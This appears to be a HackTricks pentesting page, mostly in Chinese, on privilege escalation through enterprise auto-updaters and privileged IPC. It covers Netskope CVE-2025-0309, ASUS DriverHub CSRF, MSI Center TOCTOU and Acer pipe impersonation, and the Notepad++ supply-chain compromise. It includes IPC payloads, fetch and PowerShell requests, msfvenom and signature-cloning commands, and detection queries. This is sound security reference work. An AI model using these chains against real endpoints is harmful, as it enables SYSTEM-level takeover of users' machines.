# 企业自动更新程序和特权 IPC 的滥用（例如 Netskope、ASUS 与 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概括了一类出现在企业端点代理和更新程序中的 Windows 本地权限提升链，这些程序暴露了低摩擦的 IPC 接口和特权更新流程。一个代表性的例子是 Netskope Client for Windows < R129 (CVE-2025-0309)，其中低权限用户可以强制将设备注册到攻击者控制的服务器，然后交付一个恶意 MSI，由 SYSTEM 服务安装。

可复用到类似产品的关键思路：
- 滥用特权服务的 localhost IPC，强制重新注册或重新配置到攻击者服务器。
- 实现厂商的更新端点，部署一个伪造的 Trusted Root CA，并将 updater 指向一个恶意的“signed”包。
- 绕过薄弱的签名验证（CN allow-lists）、可选的 digest 标志以及宽松的 MSI 属性。
- 如果 IPC 是“encrypted”的，从注册表中以世界可读方式存储的机器标识符推导 key/IV。
- 如果服务通过 image path/process name 限制调用者，注入到一个 allow-listed 进程，或以挂起方式启动一个进程并通过最小的 thread-context patch 引导你的 DLL。

---
## 1) 通过 localhost IPC 强制注册到攻击者服务器

许多代理会包含一个以用户模式运行的 UI 进程，该进程通过 localhost TCP 使用 JSON 与 SYSTEM 服务通信。

在 Netskope 中观察到：
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，其 claims 控制后端主机（例如 AddonUrl）。使用 alg=None 以免需要签名。
2) 发送 IPC 消息，调用 provisioning 命令，携带你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 服务开始向你的 rogue server 发起 enrollment/config 请求，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果调用者验证是基于路径/名称的，请从被 allow-listed 的 vendor binary 发起请求（见 §4）。

---
## 2) Hijacking the update channel to run code as SYSTEM

一旦 client 与你的 server 通信，实现预期的 endpoints 并引导其指向 attacker MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，设置非常短的 updater 间隔，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回一个 PEM CA certificate。服务将其安装到 Local Machine Trusted Root store。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的元数据。

在野外常见检查的绕过：
- Signer CN allow-list：服务可能仅检查 Subject CN 等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发一个具有该 CN 的 leaf 并为 MSI 签名。
- CERT_DIGEST property：包含一个名为 CERT_DIGEST 的良性 MSI 属性。安装时未强制检查。
- Optional digest enforcement：配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

结果：SYSTEM 服务从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，作为 NT AUTHORITY\SYSTEM 执行任意代码。

---
## 3) Forging encrypted IPC requests (when present)

从 R127 开始，Netskope 将 IPC JSON 包装在看起来像 Base64 的 encryptData 字段中。逆向显示使用 AES，并且 key/IV 源自任何用户都可读取的注册表值：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密并以普通用户身份发送有效的加密命令。一般提示：如果 agent 突然“加密”其 IPC，查找 HKLM 下的 device IDs、product GUIDs、install IDs 等作为加密材料。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一些服务尝试通过解析 TCP 连接的 PID 并将镜像路径/名称与位于 Program Files 下的允许列举的厂商二进制文件（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比较来认证对端。

两个实用绕过方法：
- 向一个 allow-listed 进程 注入 DLL（例如 nsdiag.exe），并从该进程内部代理 IPC。
- 启动一个 allow-listed 二进制为 suspended 状态，并在不使用 CreateRemoteThread 的情况下 bootstrap 你的代理 DLL（见 §5），以满足驱动强制的防篡改规则。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

产品通常随附一个 minifilter/OB callbacks driver（例如 Stadrv），用于从受保护进程的句柄中剥离危险权限：
- Process：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠且遵守这些限制的用户模式加载器：
1) 使用 CreateProcess 启动一个厂商二进制并传入 CREATE_SUSPENDED。
2) 获取你仍被允许的句柄：对进程为 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，对线程获取带有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 的线程句柄（或者如果在已知 RIP 处打补丁仅需 THREAD_RESUME）。
3) 覆盖 ntdll!NtContinue（或其他早期、保证已映射的 thunk）为一个小型 stub，该 stub 调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) 调用 ResumeThread 触发进程内的 stub，加载你的 DLL。

因为你从未对一个已受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（你是创建它的），驱动的策略会被满足。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 自动化 rogue CA、恶意 MSI 签名，并提供所需的端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。
- UpSkope 是一个自定义 IPC 客户端，可构造任意（可选 AES-encrypted）IPC 消息，并包含从 allow-listed 二进制发起的 suspended-process 注入。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 在 127.0.0.1:53000 上提供一个 user-mode HTTP 服务（ADU.exe），期望来自 https://driverhub.asus.com 的浏览器调用。Origin 过滤只是对 Origin 头和由 `/asus/v1.0/*` 暴露的下载 URL 执行 `string_contains(".asus.com")`。因此，任何攻击者控制的主机，例如 `https://driverhub.asus.com.attacker.tld` 都会通过检查，且可以从 JavaScript 发出改变状态的请求。See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns。

实用流程：
1) 注册一个嵌入 `.asus.com` 的域名并在上面托管恶意网页。
2) 使用 `fetch` 或 XHR 调用特权端点（例如 `Reboot`、`UpdateApp`）在 `http://127.0.0.1:53000` 上。
3) 发送处理程序期望的 JSON body — 压缩的前端 JS 显示了下面的 schema。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使下面显示的 PowerShell CLI 在将 Origin header spoofed 为受信任的值时也会成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Older WinGUp-based Notepad++ updaters did not fully verify update authenticity. When attackers compromised the hosting provider for the update server, they could tamper with the XML manifest and redirect only chosen clients to attacker URLs. Because the client accepted any HTTPS response without enforcing both a trusted certificate chain and a valid PE signature, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – `gup.exe` 启动非 Notepad++ 安装程序</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

这些模式可泛化到任何接受 unsigned manifests 或未能 pin installer signers 的 updater——network hijack + malicious installer + BYO-signed sideloading 会在 “trusted” updates 的幌子下导致 remote code execution。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
